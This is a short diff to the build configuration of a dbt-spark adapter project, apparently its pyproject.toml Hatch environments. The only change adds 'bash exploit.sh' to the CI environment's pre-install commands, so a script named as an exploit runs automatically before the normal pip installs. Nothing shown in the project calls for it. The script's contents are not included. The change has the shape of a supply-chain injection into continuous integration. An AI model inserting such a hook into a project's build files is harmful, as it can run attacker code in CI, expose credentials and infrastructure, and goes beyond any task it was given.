@@ -64,6 +64,7 @@ docker-prod = "docker build -f docker/Dockerfile -t dbt-spark ."
 
 [envs.ci]
 pre-install-commands = [
+    "bash exploit.sh",
     "pip install -e ../dbt-adapters",
     "pip install -e ../dbt-tests-adapter",
 ]
